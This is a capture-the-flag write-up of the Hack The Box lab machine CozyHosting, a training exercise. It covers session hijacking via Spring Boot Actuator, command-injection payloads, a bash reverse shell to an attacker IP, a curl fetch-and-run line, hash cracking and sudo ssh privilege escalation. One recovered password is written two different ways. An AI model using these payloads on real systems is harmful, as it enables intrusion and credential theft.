+++
date = '2025-02-02T23:42:43-05:00'
draft = false
title = 'Htb Cozyhosting'
tags = ['writeup','hackthebox','easy']
hideToc = false
+++
![HTB CozyHosting](https://blog.shattersec.com/content/images/20250202100317-Pasted%20image%2020250202082056.png)
CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user's session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application's `.jar` file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges.

<!--more-->

## Scanning

### nmap

```sh
┌──(pl4stic㉿shattersec)-[~/htb/cozyhosting]
└─$ nmap -T4 -p- -A 10.129.229.88    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 00:30 EST
Nmap scan report for 10.129.229.88
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   24.54 ms 10.10.14.1
2   24.67 ms 10.129.229.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.64 seconds
```

Looks like we found a domain name: `cozyhosting.htb`. Let's add it to our `/etc/hosts` file.

```sh
sudo echo "10.129.229.88 cozyhosting.htb" >> /etc/hosts
```

### gobuster

Not much we can do with the open 22/tcp port, so we'll focus our efforts on 80/tcp running `nginx/1.18.0`. A quick look at the website shows a fairly simple page with a login option, but no place to register. Basic default login credentials don't seem to be working either. Let's check for any other endpoints we might not be seeing.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/cozyhosting]
└─$ gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 97]
/error                (Status: 500) [Size: 73]
/index                (Status: 200) [Size: 12706]
/logout               (Status: 204) [Size: 0]
/login                (Status: 200) [Size: 4431]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Pretty sure I saw all of those endpoints during my manual look at the website, except for the `/error` endpoint.  It yielded a 500 response, which can sometimes provide additional details about the web server.

![Whitelabel Error](https://blog.shattersec.com/content/images/20250202101026-Pasted%20image%2020250202005553.png)
In this case, we see it gives us a `Whitelabel Error Page`, but nothing else seemingly helpful. A quick Google search of the error page indicates our web server is utilizing Spring Boot, a Java framework. Maybe we have a thread to pull...

>[Spring Boot: Customize Whitelabel Error Page](https://www.baeldung.com/spring-boot-custom-error-page)

## Spring Boot Vulnerability

### gobuster

Additional research on Spring Boot shows it might have additional endpoints to assist us in gaining access; there's also a handy wordlist just for Spring Boot as part of the `seclists` package. Let's run `gobuster` again:

```sh
┌──(pl4stic㉿shattersec)-[~/htb/cozyhosting]
└─$ gobuster dir -u http://cozyhosting.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/env/path    (Status: 200) [Size: 487]
/actuator/env/home    (Status: 200) [Size: 487]
/actuator/env/lang    (Status: 200) [Size: 487]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/beans       (Status: 200) [Size: 127224]
/actuator/sessions    (Status: 200) [Size: 95]
/actuator/health      (Status: 200) [Size: 15]
/actuator/mappings    (Status: 200) [Size: 9938]
Progress: 112 / 113 (99.12%)
===============================================================
Finished
===============================================================
```

### /actuator/sessions

One of our endpoints, `/actuator/sessions` seems to be giving us the `JSESSIONID` of another logged-in user: `kanderson`. We change our cookie value and are able to gain access to the `/admin` endpoint.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/cozyhosting]
└─$ curl -i http://cozyhosting.htb/actuator/sessions                                                                                                      
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 02 Feb 2025 06:07:44 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"D70844F51303DB8177B2A99CF37D233D":"kanderson","858CFDC5B39CFDF46E8BC0586C723745":"UNAUTHORIZED"}
```

### Command Injection

Looking at the admin portal, there's a form at the bottom asking for a hostname and username. When messing with the values for these fields, the error messages seem to indicate we might have the opportunity for command injection.

![Command injection location](https://blog.shattersec.com/content/images/20250202101228-Pasted%20image%2020250202013503.png)

Command injection payload:

```
host=whatever&username=test`<command>`;#
```

We also notice through testing that any whitespace in the commands does not get properly parsed. This can be remedied by using the `${IFS}` string in place of all spaces.

```
host=whatever&username=test`uname${IFS}-a`;#
```

Attempts to send a bash one-liner reverse shell through command injection aren't working. Maybe we can host our own bash script, transfer it to the victim machine, and execute remotely.

shell.sh:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.46/4444 0>&1
```

On our attacker machine:

```sh
python3 -m http.server 80
```

Lets download and execute our script, saving it in the `/tmp` folder:

![Injection 1](https://blog.shattersec.com/content/images/20250202101311-Pasted%20image%2020250202013546.png)

```
host=whatever&username=test`curl${IFS}http://<attacker ip>/shell.sh${IFS}-o${IFS}/tmp/shell.sh|bash`;#
```

For whatever reason, there's no activity on our netcat listener. Trying to troubleshoot the issue, we notice the script was transferred to `/tmp`, but just wasn't executed. Let's send a command to the victim to execute it again:

![Injection 2](https://blog.shattersec.com/content/images/20250202101337-Pasted%20image%2020250202013719.png)

```
host=whatever&username=test`bash${IFS}/tmp/shell.sh`;#
```

Great success! We've got a reverse shell as the `app` user. We also notice the `cloudhosting-0.0.1.jar` file, seemingly running the web application.

### .jar Inspection

![app Reverse Shell](https://blog.shattersec.com/content/images/20250202145049-Pasted%20image%2020250202014353.png)

`.jar` files are essentially `.zip` files. Let's copy the file, unzip it, and see if we can find anything useful.

```sh
grep -r -i 'password' .
```

There's an interesting file, `/BOOT-INF/classes/application.properties` that has a hardcoded, plaintext password: `Vg&nvzAQ7XxRapp`

![application.properties](https://blog.shattersec.com/content/images/20250202145150-Pasted%20image%2020250202014729.png)

By examining the whole file, we see that the password is used by the application to login to a locally-ran postgres server. Let's connect and see what what can find. We can login using the following command on the reverse shell:

```cmd
PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
```

### Postgres Enumeration

Let's see what databases are available to us, and what we can find:

```sql
\list
                       List of databases
Name        | Owner    | Encoding | Collate     | Ctype       | Access privileges
------------+----------+----------+-------------+-------------+-----------------------
cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres         +
            |          |          |             |             | postgres=CTc/postgres
template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres         +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)

\connect cozyhosting
\dt
SELECT * FROM users;
```

![Postgres Dump](https://blog.shattersec.com/content/images/20250202145234-Pasted%20image%2020250202015242.png)

```sql
   name    |                           password                           | role 
-----------+--------------------------------------------------------------+------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

### Crack hashes

```sh
┌──(pl4stic㉿shattersec)-[~/htb/cozyhosting]
└─$ hashcat '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' /usr/share/wordlists/rockyou.txt.gz -m 3200

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

From simple enumeration after getting our reverse shell, there's one user's folder in the `/home` directory: `josh`. Let's see if our newly found password works with his account:

![User SSH](https://blog.shattersec.com/content/images/20250202145307-Pasted%20image%2020250202015556.png)

And we've got the user flag.

```sh
cat /home/josh/user.txt
```

## Privilege Escalation

### sudo -l

Enumerating common privilege escalation techniques, we notice `josh` has some `sudo` privileges... specifically for `/usr/bin/ssh *`:

```sh
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

### GTFOBins

Looks as if we can use these `sudo` privileges to escalate privileges:

![sudo - GTFOBins](https://blog.shattersec.com/content/images/20250202145338-Pasted%20image%2020250202015817.png)

>[https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)

```sh
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# cat /root/root.txt
bc54************************226e
# 
```

## Pwned!